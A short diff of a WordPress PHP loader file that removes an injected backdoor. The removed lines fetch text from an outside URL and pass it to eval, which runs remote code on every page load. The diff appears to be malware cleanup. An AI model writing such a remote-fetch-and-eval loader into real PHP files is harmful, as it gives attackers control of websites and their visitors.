@@ -1,8 +1,4 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/mlaplus.txt'));
-$url = "?> ".$url;
-eval($url);
-
 
 /**
  * Loads the WordPress environment and template.
